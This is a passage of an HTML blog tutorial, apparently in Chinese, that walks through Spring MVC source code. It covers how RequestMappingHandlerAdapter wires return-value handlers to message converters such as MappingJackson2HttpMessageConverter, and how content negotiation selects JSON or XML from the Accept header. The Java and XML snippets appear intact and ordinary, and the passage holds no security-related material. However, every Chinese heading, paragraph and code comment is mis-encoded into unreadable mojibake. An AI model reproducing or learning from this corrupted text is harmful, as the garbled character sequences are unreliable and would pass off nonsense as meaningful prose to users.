<code>ReturnValueHandler</code>æ˜¯æ€ä¹ˆä¸<code>MappingJackson2HttpMessageConverter</code>å…³è”èµ·æ¥ï¼Ÿè¯·çœ‹ä¸‹èŠ‚ã€‚</p><h3 id="ReturnValueHandlerä¸MappingJackson2HttpMessageConverterå…³è”"><a href="#ReturnValueHandlerä¸MappingJackson2HttpMessageConverterå…³è”" class="headerlink" title="ReturnValueHandlerä¸MappingJackson2HttpMessageConverterå…³è”"></a>ReturnValueHandlerä¸MappingJackson2HttpMessageConverterå…³è”</h3><p>å†æ¬¡å›é¡¾<code>RequestMappingHandlerAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br>    <br>    ...<br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> HandlerMethodReturnValueHandlerComposite returnValueHandlers;<span class="hljs-comment">//æˆ‘ä»¬å…³æ³¨çš„returnValueHandlers</span><br>    <br>   <br>    <span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><span class="hljs-comment">//æœ¬æ–¹æ³•åœ¨AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> ModelAndView <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span><br><span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-keyword">return</span> handleInternal(request, response, (HandlerMethod) handler);<br>&#125;<br>        <br>    <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>ModelAndView mav;<br>        ...<br>        mav = invokeHandlerMethod(request, response, handlerMethod);<br>        ...<br><span class="hljs-keyword">return</span> mav;<br>&#125;<br>    <br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">WebDataBinderFactory</span> <span class="hljs-variable">binderFactory</span> <span class="hljs-operator">=</span> getDataBinderFactory(handlerMethod);<br><span class="hljs-type">ModelFactory</span> <span class="hljs-variable">modelFactory</span> <span class="hljs-operator">=</span> getModelFactory(handlerMethod, binderFactory);<br><br><span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<br>invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//&lt;---æˆ‘ä»¬å…³æ³¨çš„returnValueHandlers</span><br>invocableMethod.setHandlerMethodReturnValueHandlers(<span class="hljs-built_in">this</span>.returnValueHandlers);<br>&#125;<br>            <br>            ...<br>            <br>invocableMethod.invokeAndHandle(webRequest, mavContainer);<br><span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>webRequest.requestCompleted();<br>&#125;<br>&#125;<br>    <br>   <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterPropertiesSet</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">// Do this first, it may add ResponseBody advice beans</span><br><br>        ...<br>        <br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//èµ‹å€¼returnValueHandlers</span><br>List&lt;HandlerMethodReturnValueHandler&gt; handlers = getDefaultReturnValueHandlers();<br><span class="hljs-built_in">this</span>.returnValueHandlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerMethodReturnValueHandlerComposite</span>().addHandlers(handlers);<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-keyword">private</span> List&lt;HandlerMethodReturnValueHandler&gt; <span class="hljs-title function_">getDefaultReturnValueHandlers</span><span class="hljs-params">()</span> &#123;<br>List&lt;HandlerMethodReturnValueHandler&gt; handlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">20</span>);<br><br>...<br><span class="hljs-comment">// Annotation-based return value types</span><br>        <span class="hljs-comment">//è¿™é‡Œå°±æ˜¯ ReturnValueHandlerä¸ MappingJackson2HttpMessageConverterå…³è” çš„å…³é”®ç‚¹</span><br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestResponseBodyMethodProcessor</span>(getMessageConverters(),<span class="hljs-comment">//&lt;---MessageConvertersä¹Ÿå°±ä¼ å‚ä¼ è¿›æ¥çš„</span><br><span class="hljs-built_in">this</span>.contentNegotiationManager, <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<span class="hljs-comment">//</span><br>        ...<br><br><span class="hljs-keyword">return</span> handlers;<br>&#125;<br>    <br>    <span class="hljs-comment">//------</span><br>    <br>    <span class="hljs-keyword">public</span> List&lt;HttpMessageConverter&lt;?&gt;&gt; getMessageConverters() &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.messageConverters;<br>&#125;<br>    <br>    <span class="hljs-comment">//RequestMappingHandlerAdapteræ„é€ å™¨å·²åˆå§‹åŒ–éƒ¨åˆ†messageConverters</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">RequestMappingHandlerAdapter</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-built_in">this</span>.messageConverters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">4</span>);<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayHttpMessageConverter</span>());<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringHttpMessageConverter</span>());<br><span class="hljs-keyword">if</span> (!shouldIgnoreXml) &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SourceHttpMessageConverter</span>&lt;&gt;());<br>&#125;<br><span class="hljs-keyword">catch</span> (Error err) &#123;<br><span class="hljs-comment">// Ignore when no TransformerFactory implementation is available</span><br>&#125;<br>&#125;<br><span class="hljs-built_in">this</span>.messageConverters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AllEncompassingFormHttpMessageConverter</span>());<br>&#125;<br><br>    ...<br>              <br>&#125;<br></code></pre></td></tr></table></figure><p>åº”ç”¨ä¸­<code>WebMvcAutoConfiguration</code>ï¼ˆåº•å±‚æ˜¯<code>WebMvcConfigurationSupport</code>å®ç°ï¼‰ä¼ å…¥æ›´å¤š<code>messageConverters</code>ï¼Œå…¶ä¸­å°±åŒ…å«<code>MappingJackson2HttpMessageConverter</code>ã€‚</p><h2 id="39ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-å†…å®¹åå•†åŸç†"><a href="#39ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-å†…å®¹åå•†åŸç†" class="headerlink" title="39ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-å†…å®¹åå•†åŸç†"></a>39ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-å†…å®¹åå•†åŸç†</h2><p>æ ¹æ®å®¢æˆ·ç«¯æ¥æ”¶èƒ½åŠ›ä¸åŒï¼Œè¿”å›ä¸åŒåª’ä½“ç±»å‹çš„æ•°æ®ã€‚</p><p>å¼•å…¥XMLä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.dataformat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-dataformat-xml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ç”¨Postmanè½¯ä»¶åˆ†åˆ«æµ‹è¯•è¿”å›jsonå’Œxmlï¼šåªéœ€è¦æ”¹å˜è¯·æ±‚å¤´ä¸­Acceptå­—æ®µï¼ˆapplication&#x2F;jsonã€application&#x2F;xmlï¼‰ã€‚</p><p>Httpåè®®ä¸­è§„å®šçš„ï¼ŒAcceptå­—æ®µå‘Šè¯‰æœåŠ¡å™¨æœ¬å®¢æˆ·ç«¯å¯ä»¥æ¥æ”¶çš„æ•°æ®ç±»å‹ã€‚</p><p><strong>å†…å®¹åå•†åŸç†</strong>ï¼š</p><ol><li>åˆ¤æ–­å½“å‰å“åº”å¤´ä¸­æ˜¯å¦å·²ç»æœ‰ç¡®å®šçš„åª’ä½“ç±»å‹<code>MediaType</code>ã€‚</li><li>è·å–å®¢æˆ·ç«¯ï¼ˆPostManã€æµè§ˆå™¨ï¼‰æ”¯æŒæ¥æ”¶çš„å†…å®¹ç±»å‹ã€‚ï¼ˆè·å–å®¢æˆ·ç«¯Acceptè¯·æ±‚å¤´å­—æ®µapplication&#x2F;xmlï¼‰ï¼ˆè¿™ä¸€æ­¥åœ¨ä¸‹ä¸€èŠ‚æœ‰è¯¦ç»†ä»‹ç»ï¼‰<ul><li><code>contentNegotiationManager</code> å†…å®¹åå•†ç®¡ç†å™¨ é»˜è®¤ä½¿ç”¨åŸºäºè¯·æ±‚å¤´çš„ç­–ç•¥</li><li><code>HeaderContentNegotiationStrategy</code>  ç¡®å®šå®¢æˆ·ç«¯å¯ä»¥æ¥æ”¶çš„å†…å®¹ç±»å‹</li></ul></li><li>éå†å¾ªç¯æ‰€æœ‰å½“å‰ç³»ç»Ÿçš„ <code>MessageConverter</code>ï¼Œçœ‹è°æ”¯æŒæ“ä½œè¿™ä¸ªå¯¹è±¡ï¼ˆPersonï¼‰</li><li>æ‰¾åˆ°æ”¯æŒæ“ä½œPersonçš„converterï¼ŒæŠŠconverteræ”¯æŒçš„åª’ä½“ç±»å‹ç»Ÿè®¡å‡ºæ¥ã€‚</li><li>å®¢æˆ·ç«¯éœ€è¦application&#x2F;xmlï¼ŒæœåŠ¡ç«¯æœ‰10ç§MediaTypeã€‚</li><li>è¿›è¡Œå†…å®¹åå•†çš„æœ€ä½³åŒ¹é…åª’ä½“ç±»å‹</li><li>ç”¨ æ”¯æŒ å°†å¯¹è±¡è½¬ä¸º æœ€ä½³åŒ¹é…åª’ä½“ç±»å‹ çš„converterã€‚è°ƒç”¨å®ƒè¿›è¡Œè½¬åŒ– ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//RequestResponseBodyMethodProcessorç»§æ‰¿è¿™ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractMessageConverterMethodProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMessageConverterMethodArgumentResolver</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br><br>    ...<br>    <br>    <span class="hljs-comment">//è·Ÿä¸Šä¸€èŠ‚çš„ä»£ç ä¸€è‡´</span><br>    <span class="hljs-keyword">protected</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeWithMessageConverters</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> T value, MethodParameter returnType,</span><br><span class="hljs-params">                ServletServerHttpRequest inputMessage, ServletServerHttpResponse outputMessage)</span><br>                <span class="hljs-keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException &#123;<br><br>            Object body;<br>            Class&lt;?&gt; valueType;<br>            Type targetType;<br><br>            <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> CharSequence) &#123;<br>                body = value.toString();<br>                valueType = String.class;<br>                targetType = String.class;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                body = value;<br>                valueType = getReturnValueType(body, returnType);<br>                targetType = GenericTypeResolver.resolveType(getGenericType(returnType), returnType.getContainingClass());<br>            &#125;<br><br>...<br><br>            <span class="hljs-comment">//æœ¬èŠ‚é‡ç‚¹</span><br>            <span class="hljs-comment">//å†…å®¹åå•†ï¼ˆæµè§ˆå™¨é»˜è®¤ä¼šä»¥è¯·æ±‚å¤´(å‚æ•°Accept)çš„æ–¹å¼å‘Šè¯‰æœåŠ¡å™¨ä»–èƒ½æ¥å—ä»€ä¹ˆæ ·çš„å†…å®¹ç±»å‹ï¼‰</span><br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">selectedMediaType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> outputMessage.getHeaders().getContentType();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isContentTypePreset</span> <span class="hljs-operator">=</span> contentType != <span class="hljs-literal">null</span> &amp;&amp; contentType.isConcrete();<br>            <span class="hljs-keyword">if</span> (isContentTypePreset) &#123;<br>                <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                    logger.debug(<span class="hljs-string">&quot;Found &#x27;Content-Type:&quot;</span> + contentType + <span class="hljs-string">&quot;&#x27; in response&quot;</span>);<br>                &#125;<br>                selectedMediaType = contentType;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> inputMessage.getServletRequest();<br>                List&lt;MediaType&gt; acceptableTypes = getAcceptableMediaTypes(request);<br>                <span class="hljs-comment">//æœåŠ¡å™¨æœ€ç»ˆæ ¹æ®è‡ªå·±è‡ªèº«çš„èƒ½åŠ›ï¼Œå†³å®šæœåŠ¡å™¨èƒ½ç”Ÿäº§å‡ºä»€ä¹ˆæ ·å†…å®¹ç±»å‹çš„æ•°æ®</span><br>                List&lt;MediaType&gt; producibleTypes = getProducibleMediaTypes(request, valueType, targetType);<br><br>                <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span> &amp;&amp; producibleTypes.isEmpty()) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMessageNotWritableException</span>(<br>                            <span class="hljs-string">&quot;No converter found for return value of type: &quot;</span> + valueType);<br>                &#125;<br>                List&lt;MediaType&gt; mediaTypesToUse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>                <span class="hljs-keyword">for</span> (MediaType requestedType : acceptableTypes) &#123;<br>                    <span class="hljs-keyword">for</span> (MediaType producibleType : producibleTypes) &#123;<br>                        <span class="hljs-keyword">if</span> (requestedType.isCompatibleWith(producibleType)) &#123;<br>                            mediaTypesToUse.add(getMostSpecificMediaType(requestedType, producibleType));<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (mediaTypesToUse.isEmpty()) &#123;<br>                    <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMediaTypeNotAcceptableException</span>(producibleTypes);<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                        logger.debug(<span class="hljs-string">&quot;No match for &quot;</span> + acceptableTypes + <span class="hljs-string">&quot;, supported: &quot;</span> + producibleTypes);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                MediaType.sortBySpecificityAndQuality(mediaTypesToUse);<br><br>                <span class="hljs-comment">//é€‰æ‹©ä¸€ä¸ªMediaType</span><br>                <span class="hljs-keyword">for</span> (MediaType mediaType : mediaTypesToUse) &#123;<br>                    <span class="hljs-keyword">if</span> (mediaType.isConcrete()) &#123;<br>                        selectedMediaType = mediaType;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mediaType.isPresentIn(ALL_APPLICATION_MEDIA_TYPES)) &#123;<br>                        selectedMediaType = MediaType.APPLICATION_OCTET_STREAM;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                    logger.debug(<span class="hljs-string">&quot;Using &#x27;&quot;</span> + selectedMediaType + <span class="hljs-string">&quot;&#x27;, given &quot;</span> +<br>                            acceptableTypes + <span class="hljs-string">&quot; and supported &quot;</span> + producibleTypes);<br>                &#125;<br>            &#125;<br><br>        <br>            <span class="hljs-keyword">if</span> (selectedMediaType != <span class="hljs-literal">null</span>) &#123;<br>                selectedMediaType = selectedMediaType.removeQualityValue();<br>                <span class="hljs-comment">//æœ¬èŠ‚ä¸»è§’ï¼šHttpMessageConverter</span><br>                <span class="hljs-keyword">for</span> (HttpMessageConverter&lt;?&gt; converter : <span class="hljs-built_in">this</span>.messageConverters) &#123;<br>                    <span class="hljs-type">GenericHttpMessageConverter</span> <span class="hljs-variable">genericConverter</span> <span class="hljs-operator">=</span> (converter <span class="hljs-keyword">instanceof</span> GenericHttpMessageConverter ?<br>                            (GenericHttpMessageConverter&lt;?&gt;) converter : <span class="hljs-literal">null</span>);<br>                    <br>                    <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦å¯å†™</span><br>                    <span class="hljs-keyword">if</span> (genericConverter != <span class="hljs-literal">null</span> ?<br>                            ((GenericHttpMessageConverter) converter).canWrite(targetType, valueType, selectedMediaType) :<br>                            converter.canWrite(valueType, selectedMediaType)) &#123;<br>                        body = getAdvice().beforeBodyWrite(body, returnType, selectedMediaType,<br>                                (Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpMessageConverter</span>&lt;?&gt;&gt;) converter.getClass(),<br>                                inputMessage, outputMessage);<br>                        <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">theBody</span> <span class="hljs-operator">=</span> body;<br>                            LogFormatUtils.traceDebug(logger, traceOn -&gt;<br>                                    <span class="hljs-string">&quot;Writing [&quot;</span> + LogFormatUtils.formatValue(theBody, !traceOn) + <span class="hljs-string">&quot;]&quot;</span>);<br>                            addContentDispositionHeader(inputMessage, outputMessage);<br><span class="hljs-comment">//å¼€å§‹å†™å…¥</span><br>                            <span class="hljs-keyword">if</span> (genericConverter != <span class="hljs-literal">null</span>) &#123;<br>                                genericConverter.write(body, targetType, selectedMediaType, outputMessage);<br>                            &#125;<br>                            <span class="hljs-keyword">else</span> &#123;<br>                                ((HttpMessageConverter) converter).write(body, selectedMediaType, outputMessage);<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                                logger.debug(<span class="hljs-string">&quot;Nothing to write: null body&quot;</span>);<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>...<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="40ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-åŸºäºè¯·æ±‚å‚æ•°çš„å†…å®¹åå•†åŸç†"><a href="#40ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-åŸºäºè¯·æ±‚å‚æ•°çš„å†…å®¹åå•†åŸç†" class="headerlink" title="40ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-åŸºäºè¯·æ±‚å‚æ•°çš„å†…å®¹åå•†åŸç†"></a>40ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-åŸºäºè¯·æ±‚å‚æ•°çš„å†…å®¹åå•†åŸç†</h2><p>ä¸Šä¸€èŠ‚å†…å®¹åå•†åŸç†çš„ç¬¬äºŒæ­¥ï¼š</p><p>è·å–å®¢æˆ·ç«¯ï¼ˆPostManã€æµè§ˆå™¨ï¼‰æ”¯æŒæ¥æ”¶çš„å†…å®¹ç±»å‹ã€‚ï¼ˆè·å–å®¢æˆ·ç«¯Acceptè¯·æ±‚å¤´å­—æ®µapplication&#x2F;xmlï¼‰</p><ul><li><code>contentNegotiationManager</code> å†…å®¹åå•†ç®¡ç†å™¨ é»˜è®¤ä½¿ç”¨åŸºäºè¯·æ±‚å¤´çš„ç­–ç•¥</li><li><code>HeaderContentNegotiationStrategy</code>  ç¡®å®šå®¢æˆ·ç«¯å¯ä»¥æ¥æ”¶çš„å†…å®¹ç±»å‹</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//RequestResponseBodyMethodProcessorç»§æ‰¿è¿™ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractMessageConverterMethodProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMessageConverterMethodArgumentResolver</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br><br>    ...<br>    <br>    <span class="hljs-comment">//è·Ÿä¸Šä¸€èŠ‚çš„ä»£ç ä¸€è‡´</span><br>    <span class="hljs-keyword">protected</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeWithMessageConverters</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> T value, MethodParameter returnType,</span><br><span class="hljs-params">                ServletServerHttpRequest inputMessage, ServletServerHttpResponse outputMessage)</span><br>                <span class="hljs-keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException &#123;<br><br>            Object body;<br>            Class&lt;?&gt; valueType;<br>            Type targetType;<br>        <br>        ...<br>        <br>                    <span 